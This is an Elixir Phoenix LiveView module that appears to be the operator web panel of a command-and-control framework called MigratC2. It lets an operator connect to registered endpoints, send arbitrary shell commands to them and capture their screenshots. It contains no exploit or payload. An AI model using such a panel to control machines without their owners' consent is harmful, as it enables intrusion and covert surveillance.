defmodule MigratC2Web.ConnectionsLive.Endpoint do
  use MigratC2Web, :live_view
  require Logger

  @impl true
  def mount(_params, _session, socket) do
    MigratC2.LiveUpdate.subscibe_new_connection()

    {
      :ok,
      socket |> assign(:changeset, MigratC2.Inputs.ShellCommand.changeset(%MigratC2.Inputs.ShellCommand{}))
      |> assign(:screenshot_exists, false)
    }
  end

  @impl true
  def handle_params(%{"id" => id}, _, socket) do
    socket = socket |> assign(:id, id)
    socket = case Connections.Registry.get(id) do
      {:ok, m} ->
        socket |> assign(:exists, true) |> assign(:connection, m)
      {:err, _} -> assign(socket, :exists, false)
     end
     MigratC2.LiveUpdate.subscribe_id(id)
    {:noreply, socket}
  end

  @impl true
  def handle_info(:update, socket) do
    socket = case Connections.Registry.get(socket.assigns.id) do
      {:ok, m} -> socket |> assign(:exists, true) |> assign(:connection, m)
      {:err, _} -> assign(socket, :exists, false)
     end
    {:noreply, socket}
  end

  @impl true
  def handle_info({:screenshot, img}, socket) do
    socket = socket |> assign(:screenshot_exists, true) |> assign(:screenshot, img)
    {:noreply, socket}
  end

  @impl true
  def handle_event("connect", %{"id" => id}, socket) do
    Connections.Registry.request_connection(id)
    {:noreply, socket}
  end

  def handle_event("disconnect", _, socket) do
    Connections.Handler.disconnect(socket.assigns.connection.handler)
    {:noreply, socket}
  end

  def handle_event("shell_command", %{"shell_command" => %{"command" => command}}, socket) do
    Connections.Handler.send_shell_command(socket.assigns.connection.handler, command)
    {:noreply, socket}
  end

  def handle_event("take_screenshot", _, socket) do
    Connections.Handler.send_take_screenshot(socket.assigns.connection.handler)
    {:noreply, socket}
  end


end
